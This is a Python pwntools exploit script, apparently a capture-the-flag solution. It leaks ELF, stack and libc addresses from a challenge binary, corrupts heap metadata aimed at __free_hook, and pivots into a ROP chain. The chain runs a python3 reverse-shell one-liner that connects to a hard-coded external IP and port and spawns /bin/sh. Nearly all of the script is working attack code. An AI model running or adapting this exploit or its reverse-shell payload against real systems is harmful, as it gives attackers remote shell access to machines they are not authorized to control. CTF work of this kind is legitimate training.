#!/usr/bin/python3
from pwn import *
import base64

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('chall')
libc = ELF('./glibc/libc.so.6')

def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')
def req1(data):
    sl(p32(1) + data)
def req2(size, type, data):
    sl(p32(2) + p32(type) + data)
def req3(size, data):
    sl(p32(3) + p32(size) + data)

def GDB(proc):
    gdb.attach(p, gdbscript='''
               b *((void*)&stdout - 0x3bf2)
               b *((void*)&stdout - 0x3c3e) # option '.'
               b *((void*)&stdout - 0x406b) # read routine2
               b *((void*)&stdout - 0x2e82) # read routine3
             b *((void*)&stdout - 0x2ea1) # read size routine3
            b *((void*)&stdout - 0x3f72) # decode base64
            b *((void*)&stdout - 0x3fe0) # routine2
            b *((void*)&stdout - 0x43b9) # decode
            b *((void*)&stdout - 0x42ae) # malloc1
            b *((void*)&stdout - 0x4028) # malloc2
               b *((void*)&stdout - 0x455e)
               c
               ''')



p = remote('0', 8888)


req1(b'<'*0x19 + b'>.'*8)
leak = r(8)
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
elf.address = leak - 0x23fb
print('elf: ', hex(elf.address))

req1(b'<'*0x29 + b'>.'*8)
leak = r(8)
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
stack = leak

req1(b'<'*0x6a + b'>.'*8 + b'+')
leak = r(8)
leak = int_from_bytes(leak)
leak = leak >> 8
print('leak: ', hex(leak))
libc.address = leak - 0x9b156
print('libc: ', hex(libc.address))


req2(0x80 + 4, 1, b'A'*0x80)
for i in range(1): 
    req2(0x10 + 4, 1, b'A'*0x10)
req2(0x100 + 4 - 0x20, 1, b'A'*0xe0)

payload = b'A'*0x10 + p64(0x25) + p64(libc.symbols['__free_hook'] - 188) + p64(0x1111111111111111)*2 + p64(0x25)
payload += p64(libc.address - 0xbd7bee0 + 8) + p64(0xdeadbeef)*4 + p64(libc.address - 0xbd7bf40 - 0x80)
payload += p64(0xdeadebeef)
payload = payload.ljust(8*0x10)
#payload = p64(0xdeadbeef)*0x10
b64 = base64.b64encode(payload)
print('payload: ', b64)
print('len: ', hex(len(b64)))
req2(len(b64) + 4, 0, b64)

leak = ru(b'\x11\x11')[-10:-2]
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
mmap = leak - 0xbf6abd0
print('mmap: ', hex(mmap))
MOV_RDI_PRBX = 0x000000000009e7f1 + libc.address#: mov rdi, qword ptr [rbx + 0x48] ; mov rsi, r14 ; call rax
MOV = 0x000000000010ce85 + libc.address#: mov rdi, qword ptr [rbx + 0x80] ; call qword ptr [rax + 0x88]
CALL_RAX = 0x0000000000146e72 + libc.address#: mov rax, qword ptr [rbx + 0x20] ; mov rdi, rbp ; call qword ptr [rax + 0x20]
MOV_RDX = 0x000000000010d18b + libc.address #: mov rdx, qword ptr [rax + 0xb0] ; call qword ptr [rax + 0x88]
MOV_RSP_RDX = 0x000000000005b4d0 + libc.address#: mov rsp, rdx ; ret
POP_RDI = 0x0000000000023b6a + libc.address#: pop rdi ; ret
SYSCALL = 0x000000000002284d + libc.address#: syscall
POP_RDX_R12 = 0x0000000000119431 + libc.address#: pop rdx ; pop r12 ; ret
POP_RSI = 0x000000000002601f + libc.address#: pop rsi ; ret


MOV_RSP_RDX = 0x000000000005b4d0 + libc.address#: mov rsp, rdx ; ret
shell = b"C"*0x80 +  b"/bin/python3\x00-c\x00socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"193.161.193.99\",26863));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")\x00" + b'\x00'*4
PYTHON3 = libc.address - 0xbd7bfc0
C = PYTHON3 + 0xd
SOCKET = C + 3
ARG = libc.address - 0xbd7bd30
reverse_shell = ROP(libc)
reverse_shell.execve(PYTHON3, ARG, 0)

                                                    # pivot here v
shell += p64(MOV_RDX)*0xb + p64(MOV_RSP_RDX)*0x7 + p64(libc.address - 0xbd7c0e0 + 0x388) + p64(MOV_RSP_RDX)*4 + p64(POP_RDI + 1)*0x12 + reverse_shell.chain() + flat(PYTHON3, C, SOCKET, 0) + p64(POP_RDI) + p64(0x20) + p64(libc.symbols['sleep']) + p64(0xcafebabe)*(0x10 - 7)
#shell += p64(MOV_RDX)*0xb + p64(MOV_RSP_RDX)*0x7 + p64(libc.address - 0xbd7c0e0 + 0x380) + p64(MOV_RSP_RDX)*4 + p64(POP_RDI + 1)*0x22 + p64(libc.symbols['system'])

#shell = b'B'*0x200
req2(len(shell) + 10, 1, shell)

print(hex(CALL_RAX))
pause()

payload = p64(CALL_RAX)*2
payload = payload[:-5]
b64 = base64.b64encode(payload)
print('len: ', hex(len(b64)))
req2(len(b64) + 4, 0, b64)

p.interactive()